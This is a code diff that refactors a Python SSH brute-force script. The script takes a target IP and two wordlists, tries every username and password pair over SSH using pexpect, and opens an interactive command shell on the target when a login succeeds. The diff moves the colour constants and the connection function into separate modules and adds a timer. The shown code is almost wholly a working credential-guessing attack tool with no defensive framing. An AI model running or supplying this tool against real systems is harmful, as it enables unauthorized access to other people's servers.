@@ -3,62 +3,27 @@
 from pexpect import pxssh
 import argparse
 import time
-#import pty
 
-GREEN = '\033[92m'
-Blue = '\033[94m'
-Cyan = '\033[96m'
-Magenta = '\033[95m'
-Grey = '\033[90m'
-Black = '\033[90m'
-RED = '\033[91m'
-PURPLE = '\033[95m'
-YEL = '\033[93m'
-WHITE = '\033[37m'
-ENDC = '\033[0m'
-Default = '\033[99m'
+from p_bar import *
+
+from ssh_connect import *
+
+import color
 
 
-def connect(ip, user, passwd, port):
-	fail = 0
-
-	try:
-		ssh = pxssh.pxssh() # ssh connection setup
-		ssh.login(ip, user, passwd, port) # cred login
-		print(Cyan+'''
-[+] User Found:''',  user+'\n'+ENDC)
-		return ssh
-
-	except KeyboardInterrupt:
-		print(RED+"\n\n[-] User interrupted with Keyboard"+ENDC)
-		exit(0)
-
-	except Exception:
-		if fail > 5:
-			print(RED+"[-] !!! To Many Socket Timeout"+ENDC) 
-			exit(0)
-		elif 'read_nonblocking' in str(Exception):
-			fail += 1
-			time.sleep(5)
-			return connect(ip, user, passwd, port)
-		elif 'synchronize with original prompt' in str(Exception):
-			time.sleep(1)
-			return connect(ip, user, passwd, port)
-
-		return None
-
-
-def Main():
+def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("ip", help="Specify Target ip")
 	parser.add_argument("file1", help="Specify Wordlist")
 	parser.add_argument("file2", help="Specify Wordlist")
-	parser.add_argument("port", help="Port Number")
 
 	args = parser.parse_args()
 
-	if args.ip and args.file1 and args.file2 and args.port:
+	if args.ip and args.file1 and args.file2:
 		with open(args.file1, 'r') as lines1:
+
+			startTime = time.time()
+
 			for line in lines1: # reading a line from lines in file
 				user = line.strip("\r\n")
 
@@ -66,13 +31,23 @@ def Main():
 					for line in lines2:
 						passwd = line.strip("\r\n")
 
-						print(WHITE+"[*] Testing: ", str(user)+":"+str(passwd)+ENDC)
-						conn = connect(args.ip, user, passwd, args.port)
+						print(color.color_obj.WHITE+"[*] Testing: ", str(user)+":"+str(passwd)+color.color_obj.ENDC)
+
+						#p_bar() #Progressbar
+
+						conn = connect(args.ip, user, passwd) # ssh connect
+
 						if conn:
-							print(GREEN+'''[+] SSH connected!!, Type: exit to quit: 
-							'''+ENDC)
+
+							totalTime = time.time() - startTime
+							totalTime = '%.3f'%totalTime
+
+							print(color.color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color.color_obj.ENDC)
+
+							print(color.color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
+							'''+color.color_obj.ENDC)
+							
 							command = input(user+'@'+args.ip+':$ ')
-							#pty.spawn("/bin/bash")
 
 							while command != 'exit':
 								conn.sendline(command)
@@ -81,9 +56,9 @@ def Main():
 								command = input(user+'@'+args.ip+':$ ')
 
 							else:
-								print(YEL+'''
+								print(color.color_obj.YEL+'''
 Bye!
-									'''+ENDC)
+							'''+color.color_obj.ENDC)
 								exit(0)
 	else:
 			print(parser.usage)
@@ -91,5 +66,6 @@ Bye!
 
 
 if __name__ == '__main__':
-	Main()
+	
+	main()
 
